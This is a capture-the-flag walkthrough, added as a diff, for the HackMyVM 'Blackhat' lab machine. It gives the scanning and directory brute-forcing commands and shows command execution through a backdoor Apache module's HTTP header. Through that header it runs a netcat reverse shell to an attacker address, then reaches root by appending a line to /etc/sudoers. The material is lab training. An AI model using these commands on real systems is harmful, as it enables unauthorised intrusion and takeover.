@@ -1,0 +1,76 @@
+🧩 Blackhat Machine Walkthrough – HackMyVM
+Difficulty: Easy
+Goal: Gain initial access, escalate to user darkdante, and finally to root.
+Target IP: 192.168.1.136
+
+🔍 Initial Enumeration
+Perform a full TCP port scan:
+
+sudo nmap -p- --min-rate 5000 -n -Pn 192.168.1.136 -oG allPorts
+Discovered open port:
+
+80/tcp – Apache 2.4.54
+
+Then, service and version detection with default scripts:
+
+nmap -sCV -p80 192.168.1.136 -oN nmapblackhat.txt
+🌐 Web Analysis
+Directory brute-forcing using Gobuster:
+
+gobuster dir -u http://192.168.1.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,jpg -r
+Found paths:
+
+/index.html
+
+/image.jpg
+
+/phpinfo.php
+
+Upon inspecting phpinfo.php, a suspicious module named mod_backdoor is discovered.
+
+💥 Remote Code Execution (RCE)
+Test remote code execution via HTTP header injection:
+
+curl -H "Backdoor: id" http://192.168.1.136
+Success: the command runs as www-data.
+
+🐚 Reverse Shell
+Gain remote shell access using netcat.
+
+On the attacking machine:
+
+nc -lvnp 9999
+From the target:
+
+curl -H "Backdoor: nc 192.168.1.10 9999 -e /bin/bash" http://192.168.1.136
+Shell is established as user www-data.
+
+🔑 Privilege Escalation to User
+Check if the user darkdante has no password:
+
+su darkdante
+Access granted. The user flag is found in their home directory.
+
+⚡ Privilege Escalation to Root
+Check file permissions of /etc/sudoers:
+
+getfacl /etc/sudoers
+The user darkdante has write permissions. Add sudo privileges:
+
+echo "darkdante ALL=(ALL:ALL) ALL" >> /etc/sudoers
+Privilege escalation:
+
+sudo su
+Access gained as root. The final root flag is found at /root/root.txt.
+
+🎯 Conclusion
+The Blackhat machine is vulnerable due to:
+
+An exposed malicious Apache module (mod_backdoor).
+
+A user account without a password.
+
+Insecure permissions on a critical system file (/etc/sudoers).
+
+By exploiting these issues, full compromise of the machine is achieved.
+
